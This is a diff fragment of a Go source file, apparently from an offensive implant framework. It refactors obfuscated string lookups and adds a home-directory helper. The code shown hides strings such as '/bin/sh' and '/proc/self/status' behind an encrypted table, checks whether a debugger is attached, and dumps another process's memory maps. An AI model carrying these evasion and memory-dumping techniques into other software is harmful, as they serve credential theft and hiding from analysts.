@@ -37,20 +37,15 @@ var (
 	Shell = crypt.Get(32) // /bin/sh
 	// ShellArgs is the default machine specific command shell arguments to run
 	// commands.
-	ShellArgs = crypt.Get(33) // -c
+	ShellArgs = "-c"
 	// PowerShell is the path to the PowerShell binary, which is based on the
 	// underlying OS type.
-	PowerShell = crypt.Get(34) // pwsh
-	home       = crypt.Get(35) // $HOME
+	PowerShell = crypt.Get(33) // pwsh
 )
 
 // IsDebugged returns true if the current process is attached by a debugger.
 func IsDebugged() bool {
-	b, err := data.ReadFile(crypt.Get(36)) // /proc/self/status
-	if err != nil {
-		return false
-	}
-	for _, e := range strings.Split(string(b), "\n") {
+	for _, e := range data.ReadSplit(crypt.Get(34), "\n") { // /proc/self/status
 		if len(e) <= 9 {
 			continue
 		}
@@ -59,6 +54,30 @@ func IsDebugged() bool {
 		}
 	}
 	return false
+}
+
+// UserHomeDir returns the current user's home directory.
+//
+// On Unix, including macOS, it returns the $HOME environment variable.
+// On Windows, it returns %USERPROFILE%.
+// On Plan 9, it returns the $home environment variable.
+// On JS/WASM it returns and empty string.
+//
+// Golang compatibility helper function.
+func UserHomeDir() string {
+	if OS == Plan9 {
+		return os.Getenv(strings.ToLower(crypt.Get(35))) // HOME
+	}
+	if v := os.Getenv(crypt.Get(35)); len(v) > 0 { // HOME
+		return v
+	}
+	switch OS {
+	case IOS:
+		return "/"
+	case Android:
+		return os.Getenv(crypt.Get(36)) // /sdcard
+	}
+	return ""
 }
 
 // Logins returns an array that contains information about current logged
@@ -132,7 +151,7 @@ func DumpProcess(f *filter.Filter, w io.Writer) error {
 	if err != nil {
 		return err
 	}
-	v := crypt.Get(12) + util.Uitoa(uint64(p)) // /proc/
+	v := crypt.Get(11) + util.Uitoa(uint64(p)) // /proc/
 	b, err := data.ReadFile(v + crypt.Get(40)) // /maps
 	if err != nil {
 		return err
